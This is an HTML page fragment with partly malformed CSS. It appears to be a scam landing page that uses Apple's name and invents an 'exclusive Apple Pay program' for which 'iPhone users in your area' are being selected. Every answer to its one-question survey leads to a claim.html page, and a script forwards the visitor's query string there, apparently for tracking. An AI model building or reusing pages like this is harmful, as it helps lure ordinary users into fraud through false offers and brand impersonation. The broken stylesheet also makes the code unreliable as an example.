      display: flex;
      align-items: flex-start;
      justify-content: center;
      padding: 24px;
      padding-top: 150px;
    }
    .card {
      max-width: 420px;
      width: 100%;
      text-align: center;

    h1 {
      font-size: 30px;
      font-weight: 700;

      font-size: 15px;
      color: #555;

      line-height: 1.5;
    }
    .question {
      font-size: 17px;
      font-weight: 600;
      margin-bottom: 20px;
    }
    .option {
      display: block;
      width: 100%;
      background: #000;
      color: #fff;
      border: none;
      border-radius: 14px;
      padding: 16px;
      font-size: 16px;
      font-weight: 500;
      margin-bottom: 12px;
      cursor: pointer;
      text-decoration: none;

<body>
  <div class="card">
    <h1>Quick Question for<br>iPhone Users</h1>
    <p class="subtext">iPhone users in your area are being selected for an exclusive Apple Pay program</p>
    <p class="question">How often do you use Apple Pay?</p>

    <a href="claim.html" class="option">Every day</a>
    <a href="claim.html" class="option">A few times a week</a>
    <a href="claim.html" class="option">Rarely / Never</a>
  </div>

  <script>
    const currentQuery = window.location.search;

    document.querySelectorAll('.option').forEach(btn => {
      btn.href = 'claim.html' + currentQuery;
    });
  </script>
